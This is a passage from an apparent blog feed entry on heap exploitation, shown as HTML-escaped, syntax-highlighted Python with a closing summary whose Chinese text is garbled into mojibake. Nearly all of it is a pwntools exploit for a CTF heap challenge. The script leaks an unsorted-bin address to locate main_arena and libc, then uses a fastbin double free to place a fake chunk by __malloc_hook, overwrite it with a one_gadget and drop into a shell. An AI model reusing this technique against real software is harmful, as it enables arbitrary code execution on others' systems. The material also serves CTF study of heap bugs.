    &lt;span class=&quot;n&quot;&gt;contain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x85&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;contain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'b'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Found 135: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unsorted_bin -&amp;gt; &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main_arena_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# lock
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;# flag
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# fastbins
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# top and lastremainder
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# bins[NBINS * 2 -2]
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# offset to chunk head
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak_bins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main_arena_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unsorted_bin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_arena_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;main_arena_addr -&amp;gt; &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_arena_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_arena_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_arena_libc&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf1147&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;one_gadget -&amp;gt; &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# double free
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# malloc 3 fastbins c-&amp;gt;b-&amp;gt;a
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;' d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# a 0x60
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;' d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# b 0x60
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;' d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# c 0x60
&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# free all, now fastbins links a-&amp;gt;b-&amp;gt;c
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# free b, b-&amp;gt;a-&amp;gt;b
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main_arena_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x33&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'b'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;one_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# gdb.attach(sh)
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;æ€»ç»“&quot;&gt;æ€»ç»“&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;â€ƒâ€ƒè¿™ä¸ªé¢˜ç›®å¾ˆå¤æ‚ï¼Œæˆ‘ä»¬ä¸»è¦ç”¨åˆ°äº†uafï¼Œdouble freeï¼Œå®ç°äº†ä»»æ„å†™çš„æ•ˆæœï¼Œæœ€åé€šè¿‡è¦†å†™malloc_hookæ¥getshellï¼Œé‡Œé¢çš„ä¸€äº›ç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œæ¯”å¦‚å¦‚ä½•æ ¹æ®unsorted-binè®¡ç®—main_arenaè¿›è€Œè·å¾—offsetã€‚è¿˜æœ‰å¾ªç¯é“¾è¡¨çš„æ„é€ æ–¹å¼ï¼Œæ„Ÿè§‰é™¤äº†åˆ·é¢˜å¾ˆéš¾æœ‰æ‰‹æ„Ÿã€‚&lt;br /&gt;
â€ƒâ€ƒæ€»ä¹‹ä»Šå¤©å­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ã€‚&lt;/p&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="HeapExploit" /><category term="pwn" /><summary type="html">Arbitrary Alloc â€ƒâ€ƒè¿™ç§åˆ©ç”¨æ–¹å¼å°±æ˜¯åœ¨ç›®æ ‡ä½ç½®ä¼ªé€ ä¸€ä¸ªchunkï¼Œç„¶åoverwriteå½“å‰fastbinä¸­chunkçš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘è¯¥chunkï¼Œè¿›è€Œå®ç°ä»»æ„å†™ã€‚è¿™ç§æ¼æ´å¾€å¾€ä¼´éšç€double freeï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ å¾ªç¯é“¾è¡¨æ¥æ§åˆ¶fdæŒ‡é’ˆã€‚å…¶ä¸­ï¼Œæœ€é‡è¦çš„æ­¥éª¤å°±æ˜¯æ„é€ fake_chunkçš„sizeå­—æ®µï¼Œé€šå¸¸æˆ‘ä»¬å¯èƒ½ä¼šè¦†ç›–__malloc_hookï¼Œäºæ˜¯åœ¨å…¶å‘¨å›´ä¼ªé€ fastbinæ—¶å¾€å¾€éœ€è¦é”™ä½æ¥æ»¡è¶³sizeï¼Œè¿™é‡Œå¯ä»¥æ‰‹ç®—ï¼Œæˆ‘æ¯”è¾ƒä¹ æƒ¯ç”¨find_fake_fast &amp;lt;addr&amp;gt; sizeæ¥å¿«é€ŸæŸ¥æ‰¾åˆé€‚çš„ä½ç½®:</summary></entry></feed>